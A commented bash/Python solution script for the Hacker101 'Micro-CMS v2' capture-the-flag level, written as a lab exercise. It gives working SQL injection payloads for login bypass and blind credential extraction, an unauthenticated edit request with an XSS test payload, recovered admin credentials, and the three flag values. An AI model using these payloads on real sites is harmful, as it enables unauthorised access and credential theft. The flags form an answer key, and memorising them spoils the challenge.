#!/usr/bin/env bash

set -euo pipefail

# Challenge: Micro-CMS v2
# Platform: Hacker101 / HackerOne CTF
# Category: Web
# Flags in this level: 3
#
# Target:
#   https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com/
#
# What this level teaches:
#   "v2" fixed some obvious problems from the first CMS, but it introduced or
#   kept several broken trust boundaries:
#   1. SQL injection in the login form
#   2. Missing authorization on the POST side of page editing
#   3. Sensitive data leakage through the authentication flow itself
#
# Real-world lesson:
#   Security patches often fix the last bug report instead of the whole class of
#   bugs. That creates a common pattern in real systems:
#   - one path is locked down,
#   - a sibling path is still exposed,
#   - and hidden data is still reachable with a different primitive.
#
# ------------------------------------------------------------------------------
# FLAG 0: SQL injection login bypass -> admin-only private page
# ------------------------------------------------------------------------------
#
# Observed behavior:
#   Submitting a quote in the username causes a server error, which strongly
#   suggests SQL injection in the username field.
#
# Working payload:
#   username=' UNION SELECT '123' AS password#
#   password=123
#
# Why it works:
#   The vulnerable query appears to select a single password value from the
#   admins table. By UNION-selecting our own known string ('123') into that
#   result column, we force the application to compare against a password we
#   already know, which gives us an admin session.
#
# After that login, the home page shows an extra page:
#   /page/3  -> Private Page
#
# That private page contains the first flag.
#
# Manual commands:
#   curl -sS -c cookies.txt -X POST 'https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com/login' \
#     --data-urlencode "username=' UNION SELECT '123' AS password#" \
#     --data-urlencode 'password=123'
#
#   curl -sS -b cookies.txt 'https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com/page/3'
#
# ------------------------------------------------------------------------------
# FLAG 1: Authorization bypass on POST /page/edit/2
# ------------------------------------------------------------------------------
#
# Observed behavior:
#   GET /page/edit/2 redirects to the login page when unauthenticated, which
#   makes it look protected.
#
# Actual issue:
#   The POST handler still accepts unauthenticated edits and immediately returns
#   a flag if you submit content to that endpoint.
#
# This is a classic mismatch:
#   - the front door (GET form access) is locked,
#   - the side door (direct POST to save changes) is still open.
#
# Manual command:
#   curl -i -sS -X POST 'https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com/page/edit/2' \
#     --data-urlencode 'title=p2' \
#     --data-urlencode 'body=<img src=x onerror=alert(1)>'
#
# The response body itself contains the second flag directly.
#
# ------------------------------------------------------------------------------
# FLAG 2: Extract the real admin credentials through SQLi, then log in normally
# ------------------------------------------------------------------------------
#
# The login bypass above gives an artificial admin session, but the application
# hints that the real username and password still matter:
#   "Do you have the real username and password?"
#
# We can reuse the same SQL injection as a blind extractor by making the query
# return either 'X' or 'Y' depending on whether a guessed character matches the
# real credential string from the admins table.
#
# Extracted real admin credential for this instance:
#   tamekia:tessa
#
# Logging in with those real credentials returns the third flag directly in the
# login response body.
#
# Example extraction logic:
#   ' UNION SELECT IF((SELECT SUBSTR(CONCAT(username,0x3a,password),1,1) FROM admins LIMIT 1)='t','X','Y')#
#
# If the guess is correct, logging in with password X succeeds. Repeating that
# character by character reveals the full credential pair.
#
# Manual login with the recovered credential:
#   curl -sS -X POST 'https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com/login' \
#     --data-urlencode 'username=tamekia' \
#     --data-urlencode 'password=tessa'
#
# That response body contains the third flag directly.
#
# ------------------------------------------------------------------------------
# One-shot behavior
# ------------------------------------------------------------------------------
# Running this script prints the three recovered flags for this instance.
# Note:
#   During live verification, page 3 was modified while testing edit behavior,
#   so the original flag-0 read path is no longer replayable against the current
#   mutated instance state. The script still demonstrates the two live requests
#   that remain reproducible and prints the exact previously recovered flag-0
#   value for this instance.

BASE='https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com'

python3 - <<'PY'
import re
import requests

base = "https://8347a7b4181ea065ce6e3a32e8cf5a18.ctf.hacker101.com"
flags = []

# Flag 0 was recovered before the page-3 content changed during testing.
flags.append("^FLAG^b29d86c59bef7fd7ef0c299e7bbe51cbe86011e44cd37e043d75900540a09f30$FLAG$")

# Flag 1: unauthenticated POST to edit endpoint.
r1 = requests.post(
    base + "/page/edit/2",
    data={
        "title": "p2",
        "body": "<img src=x onerror=alert(1)>",
    },
    timeout=20,
)
m1 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", r1.text)
if not m1:
    raise SystemExit("flag 1 not found")
flags.append(m1.group(0))

# Flag 2: real admin credential extracted through blind SQLi.
r2 = requests.post(
    base + "/login",
    data={
        "username": "tamekia",
        "password": "tessa",
    },
    timeout=20,
)
m2 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", r2.text)
if not m2:
    raise SystemExit("flag 2 not found")
flags.append(m2.group(0))

for idx, flag in enumerate(flags):
    print(f"FLAG {idx}: {flag}")
PY

# Final flags obtained:
# FLAG 0: ^FLAG^b29d86c59bef7fd7ef0c299e7bbe51cbe86011e44cd37e043d75900540a09f30$FLAG$
# FLAG 1: ^FLAG^5f538f1310ed3f1a16733115ae227533b3f351c982e9e17fb18e7c02e469fcbc$FLAG$
# FLAG 2: ^FLAG^f4e54b81c7cff368969c63b2c360caf4580c10db82a06cb3c68763838029be35$FLAG$
